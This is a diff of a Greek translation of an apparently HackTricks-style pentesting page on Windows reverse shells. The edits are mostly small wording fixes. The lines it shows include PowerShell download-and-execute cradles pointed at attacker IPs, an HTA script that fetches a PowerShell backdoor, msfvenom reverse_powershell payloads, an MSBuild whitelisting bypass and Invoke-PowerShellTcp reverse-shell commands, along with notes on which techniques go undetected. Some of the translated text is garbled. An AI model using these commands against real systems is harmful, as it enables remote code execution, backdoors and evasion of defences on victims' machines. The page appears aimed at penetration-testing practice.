@@ -17,7 +17,7 @@ Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-s
 
 ## Lolbas
 
-Η σελίδα [lolbas-project.github.io](https://lolbas-project.github.io/) είναι για Windows όπως η [https://gtfobins.github.io/](https://gtfobins.github.io/) είναι για linux.\
+Η σελίδα [lolbas-project.github.io](https://lolbas-project.github.io/) είναι για Windows όπως [https://gtfobins.github.io/](https://gtfobins.github.io/) είναι για linux.\
 Προφανώς, **δεν υπάρχουν SUID αρχεία ή sudo δικαιώματα στα Windows**, αλλά είναι χρήσιμο να γνωρίζουμε **πώς** ορισμένα **binaries** μπορούν να (κατα)χρησιμοποιηθούν για να εκτελέσουν κάποιες απροσδόκητες ενέργειες όπως **η εκτέλεση αυθαίρετου κώδικα.**
 
 ## NC
@@ -93,8 +93,8 @@ powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.9:8000
 Start-Process -NoNewWindow powershell "IEX(New-Object Net.WebClient).downloadString('http://10.222.0.26:8000/ipst.ps1')"
 echo IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.13:8000/PowerUp.ps1') | powershell -noprofile
 ```
-Διαδικασία που εκτελεί κλήση δικτύου: **powershell.exe**\
-Payload που γράφτηκε στον δίσκο: **ΟΧΙ** (_τουλάχιστον πουθενά δεν μπόρεσα να βρω χρησιμοποιώντας το procmon !_ )
+Process performing network call: **powershell.exe**\
+Payload written on disk: **ΟΧΙ** (_τουλάχιστον πουθενά δεν μπόρεσα να βρω χρησιμοποιώντας το procmon !_ )
 ```bash
 powershell -exec bypass -f \\webdavserver\folder\payload.ps1
 ```
@@ -121,7 +121,7 @@ mshta http://webserver/payload.hta
 ```bash
 mshta \\webdavserver\folder\payload.hta
 ```
-#### **Παράδειγμα hta-psh αντίστροφης θηλής (χρησιμοποιήστε hta για να κατεβάσετε και να εκτελέσετε PS backdoor)**
+#### **Παράδειγμα hta-psh reverse shell (χρησιμοποιήστε το hta για να κατεβάσετε και να εκτελέσετε το PS backdoor)**
 ```xml
 <scRipt language="VBscRipT">CreateObject("WscrIpt.SheLL").Run "powershell -ep bypass -w hidden IEX (New-ObjEct System.Net.Webclient).DownloadString('http://119.91.129.12:8080/1.ps1')"</scRipt>
 ```
@@ -173,7 +173,7 @@ msf exploit(windows/misc/hta_server) > exploit
 ```bash
 Victim> mshta.exe //192.168.1.109:8080/5EEiDSd70ET0k.hta #The file name is given in the output of metasploit
 ```
-**Ανιχνεύθηκε από τον αμυντικό μηχανισμό**
+**Ανιχνεύθηκε από τον αμυντικό**
 
 
 
@@ -296,7 +296,7 @@ msfvenom -p cmd/windows/reverse_powershell lhost=10.2.0.5 lport=4444 -f vbs > sh
 \\webdavserver\folder\batchfile.bat
 ```
 Process performing network call: **svchost.exe**\
-Payload written on disk: **Τοπική μνήμη cache πελάτη WebDAV**
+Payload written on disk: **WebDAV client local cache**
 ```bash
 msfvenom -p cmd/windows/reverse_powershell lhost=10.2.0.5 lport=4444 > shell.bat
 impacket-smbserver -smb2support kali `pwd`
@@ -349,7 +349,7 @@ var r = new ActiveXObject("WScript.Shell").Run("cmd.exe /c echo IEX(New-Object N
 cmd /V /c "set MB="C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe" & !MB! /noautoresponse /preprocess \\webdavserver\folder\payload.xml > payload.xml & !MB! payload.xml"
 ```
 Μπορείτε να χρησιμοποιήσετε αυτή την τεχνική για να παρακάμψετε τους περιορισμούς Whitelisting Εφαρμογών και Powershell.exe. Καθώς θα σας ζητηθεί να ανοίξετε ένα PS shell.\
-Απλώς κατεβάστε αυτό και εκτελέστε το: [https://raw.githubusercontent.com/Cn33liz/MSBuildShell/master/MSBuildShell.csproj](https://raw.githubusercontent.com/Cn33liz/MSBuildShell/master/MSBuildShell.csproj)
+Απλά κατεβάστε αυτό και εκτελέστε το: [https://raw.githubusercontent.com/Cn33liz/MSBuildShell/master/MSBuildShell.csproj](https://raw.githubusercontent.com/Cn33liz/MSBuildShell/master/MSBuildShell.csproj)
 ```
 C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe MSBuildShell.csproj
 ```
@@ -363,7 +363,7 @@ C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /unsafe /out:shell.exe s
 ```
 Μπορείτε να κατεβάσετε μια βασική C# reverse shell από εδώ: [https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc](https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc)
 
-**Όχι ανιχνεύθηκε**
+**Δεν ανιχνεύεται**
 
 ## **Regasm/Regsvc**
 
@@ -391,7 +391,7 @@ odbcconf /s /a {regsvr \\webdavserver\folder\payload_dll.txt}
 
 [https://github.com/samratashok/nishang](https://github.com/samratashok/nishang)
 
-Στο φάκελο **Shells**, υπάρχουν πολλές διαφορετικές θάλασσες. Για να κατεβάσετε και να εκτελέσετε το Invoke-_PowerShellTcp.ps1_, κάντε ένα αντίγραφο του script και προσθέστε στο τέλος του αρχείου:
+Στο φάκελο **Shells**, υπάρχουν πολλές διαφορετικές θάλασσες. Για να κατεβάσετε και να εκτελέσετε Invoke-_PowerShellTcp.ps1_, κάντε ένα αντίγραφο του script και προσθέστε στο τέλος του αρχείου:
 ```
 Invoke-PowerShellTcp -Reverse -IPAddress 10.2.0.5 -Port 4444
 ```
